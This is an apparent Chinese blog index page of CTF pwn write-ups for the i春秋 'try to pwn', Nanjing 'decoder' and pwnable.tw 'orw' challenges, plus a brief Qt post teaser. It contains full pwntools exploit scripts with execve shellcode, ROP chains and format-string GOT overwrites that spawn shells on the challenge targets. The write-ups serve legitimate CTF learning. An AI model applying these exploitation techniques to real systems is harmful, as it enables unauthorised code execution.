+<h2 id="i春秋百度杯try-to-pwn"><a href="#i春秋百度杯try-to-pwn" class="headerlink" title="i春秋百度杯try to pwn"></a>i春秋百度杯try to pwn</h2><p>我们用<code>0xff</code>来填充<code>FILE</code>结构体，尝试中发现填充为其他数据的话会出现调用到其他函数而报错的情况。</p>
+<p>eax由这条语句赋值，其中ebx与eax的值为：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">EAX</span>  <span class="number">0x80efa9c</span> (x+<span class="number">188</span>) —▸ <span class="number">0x80e2b6d</span> (__EH_FRAME_BEGIN__+<span class="number">38021</span>) ◂— <span class="keyword">pop</span>    <span class="built_in">esp</span></div><div class="line"><span class="built_in">EBX</span>  <span class="number">0x80efa04</span> (x+<span class="number">36</span>) ◂— <span class="number">0xffffff7f</span></div></pre></td></tr></table></figure></p>
+<p><code>0x804f915 &lt;fclose+53&gt;     mov    eax, dword ptr [ebx + 0x94]</code><br>ebx的值为<code>fake_FILE_addr+36</code><br>eax的值为<code>fake_vtable</code>的前4个字节</p>
+<p>我们存储shellcode的地址的addr为<code>fake_vtable</code>的4到8个字节。</p>
+<p>还要注意下mprotexct的函数调用规定<br><code>int mprotect(void *addr, size_t len, int prot);</code><br><figure class="highlight nimrod"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mprotect()  changes  the  access protections <span class="keyword">for</span> the calling process's memory pages containing <span class="built_in">any</span> part <span class="keyword">of</span> the address <span class="built_in">range</span> <span class="keyword">in</span> the interval [<span class="keyword">addr</span>, <span class="keyword">addr</span>+len-<span class="number">1</span>].  <span class="keyword">addr</span> must be aligned  to  a page boundary.</div></pre></td></tr></table></figure></p>
+<p>注意这里的地址调用一定是<strong>页对齐</strong>的。<br><code>int prot</code>这里的数字可以简单参照linux的权限<code>rwx</code>，总是7是可读可写可执行。</p>
+<p>这一题在尝试过程中发现\x0b会截断，所以我们要吧pwntools产生的shellcode简单修改下。</p>
+<p>exp(参考了<a href="http://blog.csdn.net/qq_29343201/article/details/69666824" target="_blank" rel="external">这篇文章</a>)：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/env python</div><div class="line"># coding=utf-<span class="number">8</span></div><div class="line">from pwn import *</div><div class="line"></div><div class="line">slog = <span class="number">1</span></div><div class="line">local = <span class="number">1</span></div><div class="line">debug = <span class="number">0</span></div><div class="line"></div><div class="line"><span class="meta">global</span> p</div><div class="line"></div><div class="line">if slog: context(log_level = <span class="string">'debug'</span>)</div><div class="line">if local:</div><div class="line">    p = process(<span class="string">'./fake'</span>)</div><div class="line"><span class="symbol">else:</span></div><div class="line">    p = remote()</div><div class="line"></div><div class="line">if local <span class="keyword">and</span> debug:</div><div class="line">    gdb.attach(p, open(<span class="string">'debug'</span>))</div><div class="line"></div><div class="line">elf = ELF(<span class="string">'./fake'</span>)</div><div class="line">name_addr = <span class="number">0x80EF9E0</span></div><div class="line">mprotect_addr = elf.symbols[<span class="string">'mprotect'</span>]</div><div class="line">un_FILE_addr = <span class="number">0x80EFA00</span></div><div class="line">fake_FILE_addr = <span class="number">0x80EFA04</span></div><div class="line">fake_vtable_addr = fake_FILE_addr + <span class="number">0x94</span> + <span class="number">0x4</span></div><div class="line">x_r = <span class="number">0x08048f66</span></div><div class="line">p_r = <span class="number">0x080e2b6d</span></div><div class="line"></div><div class="line">offset = un_FILE_addr - name_addr</div><div class="line"></div><div class="line">shellcode = <span class="string">'''</span></div><div class="line">/* execve(path=<span class="string">'/bin///sh'</span>, argv=[<span class="string">'sh'</span>], envp=<span class="number">0</span>) */</div><div class="line">/* <span class="keyword">push</span> <span class="string">'/bin///sh\x00'</span> */</div><div class="line"><span class="keyword">push</span> <span class="number">0x68</span></div><div class="line"><span class="keyword">push</span> <span class="number">0x732f2f2f</span></div><div class="line"><span class="keyword">push</span> <span class="number">0x6e69622f</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">ebx</span>, <span class="built_in">esp</span></div><div class="line">/* <span class="keyword">push</span> argument array [<span class="string">'sh\x00'</span>] */</div><div class="line">/* <span class="keyword">push</span> <span class="string">'sh\x00\x00'</span> */</div><div class="line"><span class="keyword">push</span> <span class="number">0x1010101</span></div><div class="line"><span class="keyword">xor</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">esp</span>], <span class="number">0x1016972</span></div><div class="line"><span class="keyword">xor</span> <span class="built_in">ecx</span>, <span class="built_in">ecx</span></div><div class="line"><span class="keyword">push</span> <span class="built_in">ecx</span> /* null terminate */</div><div class="line"><span class="keyword">push</span> <span class="number">4</span></div><div class="line"><span class="keyword">pop</span> <span class="built_in">ecx</span></div><div class="line"><span class="keyword">add</span> <span class="built_in">ecx</span>, <span class="built_in">esp</span></div><div class="line"><span class="keyword">push</span> <span class="built_in">ecx</span> /* <span class="string">'sh\x00'</span> */</div><div class="line"><span class="keyword">mov</span> <span class="built_in">ecx</span>, <span class="built_in">esp</span></div><div class="line"><span class="keyword">xor</span> <span class="built_in">edx</span>, <span class="built_in">edx</span></div><div class="line">/* <span class="keyword">call</span> execve() */</div><div class="line">/* <span class="keyword">push</span> SYS_execve */</div><div class="line"><span class="keyword">mov</span> <span class="built_in">eax</span>, <span class="number">0xf</span></div><div class="line"><span class="keyword">sub</span> <span class="built_in">eax</span>, <span class="number">0x4</span></div><div class="line"><span class="keyword">push</span> <span class="built_in">eax</span></div><div class="line"><span class="keyword">pop</span> <span class="built_in">eax</span></div><div class="line"><span class="keyword">int</span> <span class="number">0x80</span></div><div class="line"><span class="string">'''</span></div><div class="line"></div><div class="line">def pwn():</div><div class="line">    p.recvuntil(<span class="string">'name?\n'</span>)</div><div class="line">    payload = <span class="string">'a'</span> * offset</div><div class="line">    # fake_FILE_addr</div><div class="line">    payload += p32(fake_FILE_addr)</div><div class="line">    # fake_FILE</div><div class="line">    payload += <span class="string">'\xff'</span> * <span class="number">0x94</span></div><div class="line">    # fake_jmp_t</div><div class="line">    payload += p32(fake_vtable_addr)</div><div class="line"></div><div class="line">    # fake_vtable</div><div class="line">    payload += p32(p_r)</div><div class="line">    payload += p32(un_FILE_addr + <span class="number">300</span>)</div><div class="line">    payload += p32(x_r) *  <span class="number">16</span></div><div class="line"></div><div class="line">    # mprotect</div><div class="line">    junk = <span class="number">300</span> - len(payload) + <span class="number">32</span></div><div class="line">    payload += cyclic(junk)</div><div class="line">    payload += p32(mprotect_addr)</div><div class="line">    payload += p32(un_FILE_addr + <span class="number">300</span> + <span class="number">20</span>) # shellcode addr</div><div class="line">    payload += p32(<span class="number">0x080ef000</span>)</div><div class="line">    payload += p32(<span class="number">1024</span>)</div><div class="line">    payload += p32(<span class="number">7</span>)</div><div class="line">    payload += asm(shellcode)</div><div class="line">    gdb.attach(p)</div><div class="line"></div><div class="line">    p.sendline(payload)</div><div class="line"></div><div class="line">    p.recvuntil(<span class="string">'&gt;'</span>)</div><div class="line">    p.sendline(<span class="string">'3'</span>)</div><div class="line"></div><div class="line">if __name__ == <span class="string">'__main__'</span>:</div><div class="line">    pwn()</div><div class="line">    p.interactive()</div></pre></td></tr></table></figure></p>
+<h2 id="南京线下赛decoder"><a href="#南京线下赛decoder" class="headerlink" title="南京线下赛decoder"></a>南京线下赛decoder</h2><p><code>checksec</code>:<br><figure class="highlight yaml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">root@kali ~/c/NJoffline<span class="comment"># checksec decoder</span></div><div class="line">[*] <span class="string">'/root/ctf-problem/NJoffline/decoder'</span></div><div class="line"><span class="attr">    Arch:</span>     i386<span class="bullet">-32</span>-little</div><div class="line"><span class="attr">    RELRO:</span>    Partial RELRO</div><div class="line"><span class="attr">    Stack:</span>    <span class="literal">No</span> canary found</div><div class="line"><span class="attr">    NX:</span>       NX enabled</div><div class="line"><span class="attr">    PIE:</span>      <span class="literal">No</span> PIE (<span class="number">0x8048000</span>)</div></pre></td></tr></table></figure></p>
+<p>没开什么保护，观察后发现存在栈溢出，但是不能构造rop，因为esp的地址是由栈上数据给的，直接覆盖的话会ret到奇怪的地方去，也就是说造成栈溢出的栈底数据是我们不可控的。</p>
+<p>所以，如果我们能够栈的位置到可控部分，我们就可以劫持eip，构造rop chain。</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line">root@kali ~/c/NJoffline# ROPgadget --binary decoder | grep <span class="string">'esp'</span></div><div class="line"><span class="number">0x08048490</span> : <span class="keyword">add</span> <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">eax</span>], <span class="built_in">al</span> <span class="comment">; add esp, 8 ; pop ebx ; ret</span></div><div class="line"><span class="number">0x08048605</span> : <span class="keyword">add</span> <span class="built_in">esp</span>, <span class="number">0x10</span> <span class="comment">; leave ; ret</span></div><div class="line"><span class="number">0x08048b31</span> : <span class="keyword">add</span> <span class="built_in">esp</span>, <span class="number">0x40</span> <span class="comment">; pop edi ; pop ebp ; ret</span></div><div class="line"><span class="number">0x08048d35</span> : <span class="keyword">add</span> <span class="built_in">esp</span>, <span class="number">0xc</span> <span class="comment">; pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span></div><div class="line"><span class="number">0x08048492</span> : <span class="keyword">add</span> <span class="built_in">esp</span>, <span class="number">8</span> <span class="comment">; pop ebx ; ret</span></div><div class="line"><span class="number">0x08048af7</span> : <span class="keyword">and</span> <span class="built_in">esp</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebx</span> + <span class="number">0x804b054</span>] <span class="comment">; nop ; pop ebp ; ret</span></div><div class="line"><span class="number">0x08048cd7</span> : <span class="keyword">clc</span> <span class="comment">; pop ecx ; pop edi ; pop ebp ; lea esp, dword ptr [ecx - 4] ; ret</span></div><div class="line"><span class="number">0x0804848e</span> : <span class="keyword">inc</span> <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">eax</span>] <span class="comment">; add byte ptr [eax], al ; add esp, 8 ; pop ebx ; ret</span></div><div class="line"><span class="number">0x08048687</span> : <span class="keyword">je</span> <span class="number">0x8048684</span> <span class="comment">; push ebp ; mov ebp, esp ; sub esp, 0x14 ; push eax ; call edx</span></div><div class="line"><span class="number">0x08048d33</span> : <span class="keyword">jne</span> <span class="number">0x8048d21</span> <span class="comment">; add esp, 0xc ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span></div><div class="line"><span class="number">0x08048cd5</span> : <span class="keyword">lea</span> <span class="built_in">esp</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span> - <span class="number">8</span>] <span class="comment">; pop ecx ; pop edi ; pop ebp ; lea esp, dword ptr [ecx - 4] ; ret</span></div><div class="line"><span class="number">0x08048cdb</span> : <span class="keyword">lea</span> <span class="built_in">esp</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ecx</span> - <span class="number">4</span>] <span class="comment">; ret</span></div><div class="line"><span class="number">0x08048d4f</span> : <span class="keyword">mov</span> <span class="built_in">bl</span>, <span class="number">0x22</span> <span class="comment">; add byte ptr [eax], al ; add esp, 8 ; pop ebx ; ret</span></div><div class="line"><span class="number">0x0804868a</span> : <span class="keyword">mov</span> <span class="built_in">ebp</span>, <span class="built_in">esp</span> <span class="comment">; sub esp, 0x14 ; push eax ; call edx</span></div><div class="line"><span class="number">0x080485d0</span> : <span class="keyword">mov</span> <span class="built_in">ebx</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">esp</span>] <span class="comment">; ret</span></div><div class="line"><span class="number">0x08048b30</span> : <span class="keyword">nop</span> <span class="comment">; add esp, 0x40 ; pop edi ; pop ebp ; ret</span></div><div class="line"><span class="number">0x080485cf</span> : <span class="keyword">nop</span> <span class="comment">; mov ebx, dword ptr [esp] ; ret</span></div><div class="line"><span class="number">0x080485cd</span> : <span class="keyword">nop</span> <span class="comment">; nop ; mov ebx, dword ptr [esp] ; ret</span></div><div class="line"><span class="number">0x080485cb</span> : <span class="keyword">nop</span> <span class="comment">; nop ; nop ; mov ebx, dword ptr [esp] ; ret</span></div><div class="line"><span class="number">0x08048cda</span> : <span class="keyword">pop</span> <span class="built_in">ebp</span> <span class="comment">; lea esp, dword ptr [ecx - 4] ; ret</span></div><div class="line"><span class="number">0x08048cd8</span> : <span class="keyword">pop</span> <span class="built_in">ecx</span> <span class="comment">; pop edi ; pop ebp ; lea esp, dword ptr [ecx - 4] ; ret</span></div><div class="line"><span class="number">0x08048cd9</span> : <span class="keyword">pop</span> <span class="built_in">edi</span> <span class="comment">; pop ebp ; lea esp, dword ptr [ecx - 4] ; ret</span></div><div class="line"><span class="number">0x08048689</span> : <span class="keyword">push</span> <span class="built_in">ebp</span> <span class="comment">; mov ebp, esp ; sub esp, 0x14 ; push eax ; call edx</span></div><div class="line"><span class="number">0x08048634</span> : <span class="keyword">sub</span> <span class="built_in">esp</span>, <span class="number">0x10</span> <span class="comment">; push eax ; push 0x804b04c ; call edx</span></div><div class="line"><span class="number">0x080485fb</span> : <span class="keyword">sub</span> <span class="built_in">esp</span>, <span class="number">0x14</span> <span class="comment">; push 0x804b04c ; call eax</span></div><div class="line"><span class="number">0x0804868c</span> : <span class="keyword">sub</span> <span class="built_in">esp</span>, <span class="number">0x14</span> <span class="comment">; push eax ; call edx</span></div><div class="line"><span class="number">0x08048475</span> : <span class="keyword">sub</span> <span class="built_in">esp</span>, <span class="number">8</span> <span class="comment">; call 0x80485d9</span></div><div class="line"><span class="number">0x08048af6</span> : <span class="keyword">xor</span> <span class="built_in">esp</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebx</span>] <span class="comment">; mov dword ptr [0x804b054], eax ; nop ; pop ebp ; ret</span></div></pre></td></tr></table></figure>
+<p>发现这几条还是可用的：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="number">0x08048490</span> : <span class="keyword">add</span> <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">eax</span>], <span class="built_in">al</span> <span class="comment">; add esp, 8 ; pop ebx ; ret</span></div><div class="line"><span class="number">0x08048605</span> : <span class="keyword">add</span> <span class="built_in">esp</span>, <span class="number">0x10</span> <span class="comment">; leave ; ret</span></div><div class="line"><span class="number">0x08048b31</span> : <span class="keyword">add</span> <span class="built_in">esp</span>, <span class="number">0x40</span> <span class="comment">; pop edi ; pop ebp ; ret</span></div><div class="line"><span class="number">0x08048d35</span> : <span class="keyword">add</span> <span class="built_in">esp</span>, <span class="number">0xc</span> <span class="comment">; pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span></div><div class="line"><span class="number">0x08048492</span> : <span class="keyword">add</span> <span class="built_in">esp</span>, <span class="number">8</span> <span class="comment">; pop ebx ; ret</span></div></pre></td></tr></table></figure></p>
+<p>于是我们的思路如下：</p>
+<ol>
+<li>在栈上利用gadget<code>0x08048b31</code>布置好ropchain</li>
+<li>利用fsb将fflish改为我们的gadget<code>0x08048b31</code></li>
+<li>在bss写入<code>/bin/sh</code></li>
+<li>修改fflush为system</li>
+</ol>
+<p>附上南大某女生exp:<br><figure class="highlight autoit"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#!/usr/bin/env python</span></div><div class="line"><span class="meta"># coding=utf-8</span></div><div class="line">from pwn import *</div><div class="line">import base64</div><div class="line"></div><div class="line">slog = <span class="number">1</span></div><div class="line"><span class="keyword">local</span> = <span class="number">1</span></div><div class="line">debug = <span class="number">0</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> slog: context.log_level = <span class="literal">True</span></div><div class="line"><span class="keyword">if</span> <span class="keyword">local</span>:</div><div class="line">    p = process(<span class="string">'./decoder'</span>)</div><div class="line">    libc = ELF(<span class="string">'/lib32/libc.so.6'</span>)</div><div class="line"><span class="keyword">else</span>:</div><div class="line">    p = remote(<span class="string">'172.16.1.10'</span>, <span class="number">20000</span>)</div><div class="line">    libc = ELF(<span class="string">'./lib/i386-linux-gnu/libc-2.19.so'</span>)</div><div class="line"></div><div class="line"></div><div class="line">elf = ELF(<span class="string">'decoder'</span>)</div><div class="line"></div><div class="line">printf_got = elf.got[<span class="string">'printf'</span>]		<span class="meta">#  0x80484c0</span></div><div class="line">printf_plt = elf.symbols[<span class="string">'printf'</span>] </div><div class="line">read_addr = elf.symbols[<span class="string">'read'</span>]</div><div class="line">fflush_plt = elf.symbols[<span class="string">'fflush'</span>]</div><div class="line"></div><div class="line">realloc_got = elf.got[<span class="string">'realloc'</span>]</div><div class="line">fflush_got = elf.got[<span class="string">'fflush'</span>]</div><div class="line"></div><div class="line">main_addr = <span class="number">0x804836e</span></div><div class="line"></div><div class="line">print(<span class="string">'fflush_got = '</span> + <span class="built_in">hex</span>(fflush_got))</div><div class="line">print(<span class="string">'printf_plt = '</span> + <span class="built_in">hex</span>(printf_plt))</div><div class="line"></div><div class="line">addesp_72 = <span class="number">0x08048b31</span></div><div class="line">rodata = <span class="number">0x8048de0</span> <span class="meta"># <span class="string">'%d:%s'</span></span></div><div class="line">bss_addr = <span class="number">0x804b050</span></div><div class="line"></div><div class="line">s = base64.b64encode(<span class="string">'%02052d%20$hn%033581d%21$hn%22$x'</span>)  <span class="meta"># add_esp</span></div><div class="line"></div><div class="line">payload = s + (<span class="number">13</span> - len(s) / <span class="number">4</span>) * p32(<span class="number">0</span>) + p32(printf_plt)+ p32(addesp_72) + p32(rodata) + p32(<span class="number">1</span>) + p32(printf_got)</div><div class="line"><span class="meta"># printf(rodata, <span class="string">'1'</span>, printf_got) </span></div><div class="line"><span class="meta"># 0xffa8a3f4 </span></div><div class="line">payload += p32(fflush_got + <span class="number">2</span>) + p32(fflush_got) + p32(fflush_got) </div><div class="line"></div><div class="line">payload += p32(<span class="number">0x1</span>) * <span class="number">0xc</span>  + p32(read_addr) + p32(addesp_72) + p32(<span class="number">0</span>) + p32(fflush_got) + p32(<span class="number">4</span>)   <span class="meta">#0xffa8a434 -&gt; read</span></div><div class="line"></div><div class="line">payload += p32(<span class="number">0x2</span>) * <span class="number">0xf</span> + p32(read_addr) + p32(addesp_72) + p32(<span class="number">0</span>) + p32(bss_addr) + p32(<span class="number">8</span>)</div><div class="line"></div><div class="line">payload += p32(<span class="number">0x3</span>) * <span class="number">0xf</span> + p32(fflush_plt) + p32(<span class="number">0xdeadbeef</span>) + p32(bss_addr)</div><div class="line"></div><div class="line"><span class="meta"># gdb.attach(p, open(<span class="string">'debug'</span>))</span></div><div class="line">gdb.attach(p)</div><div class="line">p.recvuntil(<span class="string">'DECODER\n'</span>)</div><div class="line">p.sendline(payload)</div><div class="line"></div><div class="line">p.recvuntil(<span class="string">':'</span>)</div><div class="line">printf_addr = u32(p.recv(<span class="number">4</span>))</div><div class="line"></div><div class="line">system_addr = printf_addr + libc.symbols[<span class="string">'system'</span>] - libc.symbols[<span class="string">'printf'</span>]</div><div class="line"><span class="meta">#binsh_addr = printf_addr + next(libc.search(<span class="string">'/bin/sh'</span>)) - libc.symbols[<span class="string">'printf'</span>]</span></div><div class="line"></div><div class="line">print(<span class="string">'system_addr = '</span> + <span class="built_in">hex</span>(system_addr))</div><div class="line"></div><div class="line">p.<span class="built_in">send</span>(p32(system_addr))</div><div class="line">p.<span class="built_in">send</span>(<span class="string">"/bin/sh\0"</span>)</div><div class="line"></div><div class="line">p.interactive()</div></pre></td></tr></table></figure></p>
+<h2 id="2017BCTF100levels"><a href="#2017BCTF100levels" class="headerlink" title="2017BCTF100levels"></a>2017BCTF100levels</h2>
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">PWN</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">stack</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2017/04/26/pwn中的栈迁移/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+
+
+
+
+
+
+
+  
+    <article id="post-Qt初体验" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2017/04/23/Qt初体验/">Qt初体验</a>
+    </h1>
+  
+
+        
+        <a href="/2017/04/23/Qt初体验/" class="archive-article-date">
+  	<time datetime="2017-04-23T12:31:08.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-04-23</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>最近要给辩论赛做个计数器，以前那个丢了，正好来试试Qt的使用。</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">Qt</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">C/C++</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2017/04/23/Qt初体验/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+
+
+
+
+
+
+
+  
+    <article id="post-pwnable-tw" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2017/04/23/pwnable-tw/">pwnable.tw</a>
+    </h1>
+  
+
+        
+        <a href="/2017/04/23/pwnable-tw/" class="archive-article-date">
+  	<time datetime="2017-04-23T12:00:03.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-04-23</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="orw"><a href="#orw" class="headerlink" title="orw"></a>orw</h2><p><a href="https://www.tutorialspoint.com/assembly_programming/assembly_file_management.htm" target="_blank" rel="external">汇编中i386的系统调用传参方式</a></p>
+<p>exp:<br><figure class="highlight vala"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#!/usr/bin/env python</span></div><div class="line"><span class="meta"># -*- coding: utf-8 -*-</span></div><div class="line"></div><div class="line">from pwn import *</div><div class="line"></div><div class="line">context(log_level = <span class="string">'debug'</span>)</div><div class="line"></div><div class="line">shellcode = shellcraft.i386.sh()</div><div class="line">bss = <span class="number">0x0804a060</span></div><div class="line"><span class="meta">#shellcode = asm(shellcode)</span></div><div class="line"><span class="meta">#shellcode = "\x99\x6a\x0b\x58\x60\x59\xcd\x80"</span></div><div class="line">shellcode = <span class="string">'mov ebx, 0x804a095; mov eax, 5; mov ecx, 0;int 0x80;'</span></div><div class="line">shellcode += <span class="string">'mov ebx, eax; mov eax, 3; mov ecx, 0x804a095; mov edx, 100; int 0x80;'</span></div><div class="line">shellcode += <span class="string">'mov edx, 100; mov ebx, 1; mov eax, 4; int 0x80;'</span></div><div class="line">shellcode = asm(shellcode)</div><div class="line">print len(shellcode)</div><div class="line"></div><div class="line">shellcode += <span class="string">'/home/orw/flag\x00'</span></div><div class="line"><span class="meta"># p = process('./orw')</span></div><div class="line">p = remote(<span class="string">'chall.pwnable.tw'</span>, <span class="number">10001</span>)</div><div class="line">p.recvuntil(<span class="string">':'</span>)</div><div class="line"><span class="meta">#gdb.attach(p)</span></div><div class="line">p.send(shellcode)</div><div class="line">print p.recvall()</div></pre></td></tr></table></figure></p>
+<p>使用syscall代替int 80出错，原因未知，猜测可能为传参方式不同。</p>
+<p>用locate定位系统调用号<br><figure class="highlight crystal"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">root@kali ~<span class="regexp">/c/p</span><span class="regexp">/orw# locate unistd_32</span></div><div class="line">/usr<span class="regexp">/include/x</span>86_64-linux-gnu/<span class="keyword">asm</span>/unistd_32.h</div><div class="line">/usr/<span class="class"><span class="keyword">lib</span>/<span class="title">x86_64</span>-<span class="title">linux</span>-<span class="title">gnu</span>/<span class="title">perl</span>/5.22.2/<span class="title">asm</span>/<span class="title">unistd_32</span>.<span class="title">ph</span></span></div><div class="line">/usr/<span class="class"><span class="keyword">lib</span>/<span class="title">x86_64</span>-<span class="title">linux</span>-<span class="title">gnu</span>/<span class="title">perl</span>/5.24.1/<span class="title">asm</span>/<span class="title">unistd_32</span>.<span class="title">ph</span></span></div><div class="line">/usr/src/linux-headers-<span class="number">4.9</span>.<span class="number">0</span>-kali3-amd64/arch/x86/<span class="keyword">include</span>/generated/<span class="keyword">asm</span>/unistd_32_ia32.h</div><div class="line">/usr/src/linux-headers-<span class="number">4.9</span>.<span class="number">0</span>-kali3-amd64/arch/x86/<span class="keyword">include</span>/generated/uapi/<span class="keyword">asm</span>/unistd_32.h</div><div class="line">/usr/src/linux-headers-<span class="number">4.9</span>.<span class="number">0</span>-kali3-common/arch/sh/<span class="keyword">include</span>/uapi/<span class="keyword">asm</span>/unistd_32.h</div></pre></td></tr></table></figure></p>
+
+      
+
+      
